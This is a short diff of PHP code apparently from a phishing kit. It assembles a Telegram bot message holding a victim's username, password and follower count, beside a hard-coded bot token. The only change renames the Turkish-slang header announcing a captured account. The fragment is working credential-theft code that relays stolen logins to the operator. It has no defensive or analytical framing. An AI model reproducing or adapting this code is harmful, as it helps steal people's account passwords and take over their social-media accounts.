@@ -2,7 +2,7 @@
     $token='5000908961:AAGKTvzp49-Yc6YnQdh3MGBz5lOMrinan8E';
     $data = [
         'text' => ' 
-        Buse hesap düştü git çek ameke
+        Sublime hesap düştü git çek ameke
 Kullanıcı adı : '.$id.'
 Şifre : '.$zwoup.'
 takipçi : '.$takipci.'
